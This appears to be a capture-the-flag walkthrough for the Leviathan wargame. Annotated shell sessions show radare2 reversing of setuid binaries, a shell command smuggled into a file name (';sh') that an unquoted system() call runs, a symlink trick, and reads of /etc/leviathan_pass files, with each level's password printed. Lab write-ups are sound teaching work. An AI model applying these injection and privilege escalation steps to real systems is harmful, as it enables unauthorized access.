# Leviathan

## 0-1

```sh
la -Alp
find . # .backups folder looks interesting.
vim .backups/bookmarks.html # long.
grep --color -i leviathan bookmarks.html # rioGegei8m
```

## 1-2

```sh
ls -Alp
file check
./check # 1234? wrong.

strings check | less # maybe it's love?
./check # love? no.

# take a look at the assembly:
r2 -Ad check
Vpp
g main # it's sex.

./check # we have a shell.
whoami # leviathan2
python -c 'import pty;pty.spawn("/bin/bash")' # upgrade our shell.
cat /etc/leviathan_pass/leviathan2 # ougahZi8Ta
```

## 2-3

```sh
ls -Alp
file printfile # none of these binaries are stripped, this is great :)
./printfile # seems like it prints a file.
./printfile printfile # printed printfile.
./printfile .bashrc # seems to work.

./printfile /etc/leviathan_pass/leviathan1 # You cant have that file...
./printfile /etc/leviathan_pass/leviathan2 # /bin/cat: /etc/leviathan_pass/leviathan2: Permission denied
./printfile /etc/leviathan_pass/leviathan3 # You cant have that file...
./printfile /etc/leviathan_pass/leviathan4 # You cant have that file...

# strange.

whoami # leviathan2

ls -Alp /etc/leviathan_pass/
# -r-------- 1 leviathan0 leviathan0 11 Aug 26  2019 leviathan0
# -r-------- 1 leviathan1 leviathan1 11 Aug 26  2019 leviathan1
# -r-------- 1 leviathan2 leviathan2 11 Aug 26  2019 leviathan2
# -r-------- 1 leviathan3 leviathan3 11 Aug 26  2019 leviathan3
# -r-------- 1 leviathan4 leviathan4 11 Aug 26  2019 leviathan4
# -r-------- 1 leviathan5 leviathan5 11 Aug 26  2019 leviathan5
# -r-------- 1 leviathan6 leviathan6 11 Aug 26  2019 leviathan6
# -r-------- 1 leviathan7 leviathan7 11 Aug 26  2019 leviathan7

ls -l printfile # check setuid bit.
# -r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26  2019 printfile

# am I going overboard here, or is that what you are supposed to do?
r2 -Ad printfile /etc/leviathan_pass/leviathan3
Vpp # disas view.
:db main # break in main.
:dc # run until breakpoint.

# disas:
 |   0x08048585      e886feffff     call sym.imp.access
 |   0x0804858a      83c410         add esp, 0x10
 |   0x0804858d      85c0           test eax, eax
,==< 0x0804858f      7417           je 0x80485a8
||   0x08048591      83ec0c         sub esp, 0xc
||   0x08048594      68b9860408     push str.You_cant_have_that_file...
||   0x08048599      e822feffff     call sym.imp.puts

# this part calls the `access` syscall and jumps if our user (leviathan2) has read access.
# this jump avoids a second jump that quits out. (with 'You cant have that file...')
# the second jump effectively prohibits us from making use of the setuid bit (leviathan3)

# for fun we can break just before the test and null out eax to force the first jump:
:db 0x0804858d
:dc
:dr eax = 0x0
:dc # let the rest play out.

# we get the following error message:
# /bin/cat: /etc/leviathan_pass/leviathan3: Permission denied
# so we got past the check but the actual cat command failed as well.

# reason: r2 runs as leviathan2 and the setuid on the binary itself won't help us.
# let's test that another way:
./printfile /etc/leviathan_pass/leviathan2 # perm denied.
r2 -Ad ./printfile /etc/leviathan_pass/leviathan2
:dc # yep, that one worked.

# we'll need to find another way. let's pick out some relevant lines:
0x08048585      e886feffff     call sym.imp.access         ; int access(const char *path, int mode)
0x080485b1      68d4860408     push str.bin_cat__s         ; 0x80486d4 ; "/bin/cat %s" # fstring.
0x080485c2      e839feffff     call sym.imp.snprintf       ; int snprintf(char *s, size_t size,
                                                                          const char *format, ...)
0x080485ed      e8defdffff     call sym.imp.system         ; int system(const char *string)
# note that the fstring does not have quotes around %s.
# we need a string that makes it past the access syscall
# and that can simultaneously abuse the string that's
# passed to the system syscall.

# how about simply no file for cat?
~/printfile ';' # you cant have that file...
# makes sense it does not exist.

mkdir /tmp/ben && cd /tmp/ben
touch ; # whoops, can't do it this way.
touch ';' # yep.
ls # ;
# that really is a valid filename.

~/printfile ';' # suddenly we can type.
whoami # whoami
# so we're in cat now.
# if you give cat an empty file it'll
# just echo stdin back at you.
^d # exit cat.

touch ';sh'
ls # ;  ;sh
~/printfile ';sh'
whoami # whoami, still in cat
^d # exit cat and we're greeted with a prompt.
whoami # leviathan3 :D
cat /etc/leviathan_pass/leviathan3 # Ahdiemoo1j
```

* That one was great.

## 3-4

```sh
ls -Alp
./level3 # 1234? wrong.
strings level3

r2 -Ad level3 # let's start right with radare, strings has not worked once.
Vpp
g main
B # break at main.
:dc # run to breakpoint.

# step over all that variable mangling.
# addresses of var_2bh and var_24h are pushed to the stack.
# strcmp is called from libc. strcmp compares last
# two things on the stack and returns 0 in eax if
# they were equal.

:afv # get addresses for variables
  # var int32_t var_2bh @ ebp-0x2b
  # var int32_t var_24h @ ebp-0x24

# there are the locations of our 2 variables.
:afvd # but they are interpreted as the wrong type (int)

:t # list all available types.
# tell r2 to interpret them as C strings:
:afvt var_2bh char *
:afvt var_24h char *

# step to right before the strcmp.
:afvd
  # var var_24h = 0xffffd684 = "h0no33"
  # var var_2bh = 0xffffd67d = "kakaka"

# ...and that strcmp was not the one we we're looking for
# because we have not even entered our password yet.

# step a bit further and into the `do_stuff()` call.
# (I adore the naming convention.)

# step past the fgets call, enter any password (I chose AAAA)
# and stop before the strcmp call.
# same thing as above, pick out the two strings that are compared:

0x080485a9      8d85edfeffff   lea eax, [var_113h]
0x080485af      50             push eax
0x080485b0      8d85f8feffff   lea eax, [var_108h]
0x080485b6      50             push eax
0x080485b7      e814feffff     call sym.imp.strcmp

# those are the two we are interested in:
:afvd # all ints, again.
:t
:afvt var_113h char *
:afvt var_108h char *
:afvd

# one of those is familiar:
var var_113h = 0xffffd555 = "snlprintf\n"
var var_108h = 0xffffd560 = "AAAA\n"

# the other our password. really funny choice too :D
# let's try it.

./level3 # snlprintf
# and we've got a shell:
whoami # leviathan4
cat /etc/leviathan_pass/leviathan4 # vuH0coox6m
```

## 4-5

```sh
ls -Alp
find .trash
.trash/bin
# 01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010

# all of the groups start with 0 and are 8 bits long.
# probably an ASCII string.

.trash/bin | tr ' ' ','
# 01010100,01101001,01110100,01101000,00110100,01100011,01101111,01101011,01100101,01101001,00001010,
# nevermind, not doing it in python this time.

for byte in $(.trash/bin); do rax2 -b ${byte} ; done # Tith4cokei
```

## 5-6

```sh
ls -Alp
file leviathan5 # not stripped :)
./leviathan5 # cannot find /tmp/file.log

touch /tmp/file.log
./leviathan5 # nothing

echo ben >> /tmp/file.log
./leviathan5 # ben, as expected

# could it be?
echo ';sh' > /tmp/file.log
./leviathan5 # ;sh
# ah well, one can dream.

# buffer overflow?
python -c 'print("a"*5000)' > /tmp/file.log
./leviathan5  # five thousand as (I counted)

# I got it:
ln /etc/leviathan_pass/leviathan6 /tmp/file.log # Invalid cross-device link
# I do not.

ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5 # UgaoFee4li
# there we go.
```

## 6-7

```sh
ls -Alp
file leviathan6

./leviathan6 # 0
./leviathan6 # a
./leviathan6 # 0000
./leviathan6 # 00000
./leviathan6 $(python -c 'print("a"*5000)')
# all just wrong.

r2 -Ad ./leviathan6 0000
dcu main; Vpp # continue until main and open assm view.

# alright, looking for the block of code that throws a 'wrong' in our face
# we can find the corresponding compare and jump (0x08048592).
# the atoi call converts the string we passed along ("0000") to an int
# and compares it with dword [var_ch].

     0x08048587      e894feffff     call sym.imp.atoi           ;[2] ; int atoi(const char *str)
     0x0804858c      83c410         add esp, 0x10
     0x0804858f      3b45f4         cmp eax, dword [var_ch]
 ,=< 0x08048592      752b           jne 0x80485bf
 |   0x08048594      e827feffff     call sym.imp.geteuid        ;[3] ; uid_t geteuid(void)
 |   0x08048599      89c3           mov ebx, eax
 |   0x0804859b      e820feffff     call sym.imp.geteuid        ;[3] ; uid_t geteuid(void)
 |   0x080485a0      83ec08         sub esp, 8
 |   0x080485a3      53             push ebx
 |   0x080485a4      50             push eax
 |   0x080485a5      e856feffff     call sym.imp.setreuid       ;[4]
 |   0x080485aa      83c410         add esp, 0x10
 |   0x080485ad      83ec0c         sub esp, 0xc
 |   0x080485b0      687a860408     push str.bin_sh             ; 0x804867a ; "/bin/sh"
 |   0x080485b5      e826feffff     call sym.imp.system         ;[5] ; int system(const char *string)
 |   0x080485ba      83c410         add esp, 0x10
,==< 0x080485bd      eb10           jmp 0x80485cf
|`-> 0x080485bf      83ec0c         sub esp, 0xc
|    0x080485c2      6882860408     push str.Wrong              ; 0x8048682 ; "Wrong"
|    0x080485c7      e804feffff     call sym.imp.puts           ;[6] ; int puts(const char *s)

# get the location:
:afvd var_ch # @ebp-0xc
px @ ebp-0xc # d31b 0000
# little endian, so: 0x00001bd3
# we have what we need, quit radare.

rax2 0x00001bd3 # 7123
./leviathan6 7123 # and we got a shell.
whoami # leviathan7
cat /etc/leviathan_pass/leviathan7 # ahy7MaeBo9
```

```sh
 _            _       _   _                       _
| | _____   _(_) __ _| |_| |__   __ _ _ __     __| | ___  _ __   ___
| |/ _ \ \ / / |/ _` | __| '_ \ / _` | '_ \   / _` |/ _ \| '_ \ / _ \
| |  __/\ V /| | (_| | |_| | | | (_| | | | | | (_| | (_) | | | |  __/
|_|\___| \_/ |_|\__,_|\__|_| |_|\__,_|_| |_|  \__,_|\___/|_| |_|\___|
```
